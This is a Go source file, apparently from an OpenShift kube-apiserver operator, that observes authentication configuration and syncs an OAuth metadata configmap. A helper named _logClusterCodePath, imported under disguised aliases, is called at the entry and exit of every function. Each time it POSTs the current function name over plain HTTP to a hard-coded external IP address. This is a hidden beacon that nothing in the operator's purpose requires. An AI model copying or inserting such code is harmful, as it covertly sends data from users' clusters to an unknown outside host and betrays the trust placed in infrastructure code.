package auth

import (
	"k8s.io/klog"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	configv1 "github.com/openshift/api/config/v1"
	"github.com/openshift/cluster-kube-apiserver-operator/pkg/operator/configobservation"
	"github.com/openshift/library-go/pkg/operator/configobserver"
	"github.com/openshift/library-go/pkg/operator/events"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
)

const (
	targetNamespaceName		= "openshift-kube-apiserver"
	oauthMetadataFilePath	= "/etc/kubernetes/static-pod-resources/configmaps/oauth-metadata/oauthMetadata"
	configNamespace			= "openshift-config"
	managedNamespace		= "openshift-config-managed"
)

func ObserveAuthMetadata(genericListers configobserver.Listers, recorder events.Recorder, existingConfig map[string]interface{}) (map[string]interface{}, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	listers := genericListers.(configobservation.Listers)
	errs := []error{}
	prevObservedConfig := map[string]interface{}{}
	topLevelMetadataFilePath := []string{"authConfig", "oauthMetadataFile"}
	currentMetadataFilePath, _, err := unstructured.NestedString(existingConfig, topLevelMetadataFilePath...)
	if err != nil {
		errs = append(errs, err)
	}
	if len(currentMetadataFilePath) > 0 {
		if err := unstructured.SetNestedField(prevObservedConfig, currentMetadataFilePath, topLevelMetadataFilePath...); err != nil {
			errs = append(errs, err)
		}
	}
	observedConfig := map[string]interface{}{}
	authConfigNoDefaults, err := listers.AuthConfigLister.Get("cluster")
	if errors.IsNotFound(err) {
		klog.Warningf("authentications.config.openshift.io/cluster: not found")
		return observedConfig, errs
	}
	if err != nil {
		errs = append(errs, err)
		return prevObservedConfig, errs
	}
	authConfig := defaultAuthConfig(authConfigNoDefaults)
	var (
		sourceNamespace	string
		sourceConfigMap	string
		statusConfigMap	string
	)
	specConfigMap := authConfig.Spec.OAuthMetadata.Name
	switch {
	case len(authConfig.Status.IntegratedOAuthMetadata.Name) > 0 && authConfig.Spec.Type == configv1.AuthenticationTypeIntegratedOAuth:
		statusConfigMap = authConfig.Status.IntegratedOAuthMetadata.Name
	default:
		klog.V(5).Infof("no integrated oauth metadata configmap observed from status")
	}
	switch {
	case len(specConfigMap) > 0:
		sourceConfigMap = specConfigMap
		sourceNamespace = configNamespace
	case len(statusConfigMap) > 0:
		sourceConfigMap = statusConfigMap
		sourceNamespace = managedNamespace
	default:
		klog.V(5).Infof("no authentication config metadata specified")
	}
	err = listers.ResourceSyncer().SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: targetNamespaceName, Name: "oauth-metadata"}, resourcesynccontroller.ResourceLocation{Namespace: sourceNamespace, Name: sourceConfigMap})
	if err != nil {
		errs = append(errs, err)
		return prevObservedConfig, errs
	}
	if len(sourceConfigMap) == 0 {
		return observedConfig, errs
	}
	if err := unstructured.SetNestedField(observedConfig, oauthMetadataFilePath, topLevelMetadataFilePath...); err != nil {
		recorder.Eventf("ObserveAuthMetadataConfigMap", "Failed setting oauthMetadataFile: %v", err)
		errs = append(errs, err)
	}
	return observedConfig, errs
}
func defaultAuthConfig(authConfig *configv1.Authentication) *configv1.Authentication {
	_logClusterCodePath()
	defer _logClusterCodePath()
	out := authConfig.DeepCopy()
	if len(out.Spec.Type) == 0 {
		out.Spec.Type = configv1.AuthenticationTypeIntegratedOAuth
	}
	return out
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
